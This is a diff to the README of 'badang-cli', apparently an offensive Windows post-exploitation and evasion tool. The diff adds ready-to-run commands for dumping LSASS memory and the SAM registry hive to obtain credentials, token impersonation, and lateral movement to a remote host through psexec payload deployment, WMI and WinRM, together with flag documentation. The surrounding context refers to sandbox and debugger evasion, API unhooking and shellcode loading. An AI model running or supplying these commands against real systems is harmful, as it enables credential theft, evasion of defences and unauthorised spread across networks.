@@ -115,6 +115,18 @@ badang-cli loader --check debug --action exit -x -c          # terminate on dete
 Categories: `sandbox` (env), `debug` (dbg), `vm` (hw), `all` (full)
 Actions: `report` (default), `exit`
 
+### Post-Exploitation
+```bash
+badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c     # memory snapshot
+badang-cli postex --module sam --postex-output C:\Temp -x -c                  # registry export
+badang-cli postex --module token --pid 672 -x -c                              # session delegation
+badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c
+badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd "cmd /c whoami" -x -c
+badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd "hostname" -x -c
+```
+
+Modules: `lsass` (memdump/snapshot), `sam` (registry/hive), `token` (delegate/session), `psexec` (service/svc), `wmi` (wmic), `winrm` (winrs)
+
 ### Unhook
 ```bash
 badang-cli unhook --unhook NtCreateThreadEx -x -c
@@ -180,3 +192,11 @@ badang-cli load --payload shellcode.bin
 | `--sleep-obfs` | | Enable sleep obfuscation (comms) |
 | `--check` | | Loader check category: sandbox/debug/vm/all |
 | `--action` | | Loader fail action: report/exit |
+| `--module` | | Post-ex module: lsass/sam/token/psexec/wmi/winrm |
+| `--remote` | | Remote target host (postex lateral) |
+| `--postex-output` | | Output path (postex creds) |
+| `--postex-user` | | Remote username (postex lateral) |
+| `--postex-pass` | | Remote password (postex lateral) |
+| `--postex-cmd` | | Remote command (postex wmi/winrm) |
+| `--postex-service` | | Service name (postex psexec) |
+| `--postex-payload` | | Payload path (postex psexec) |
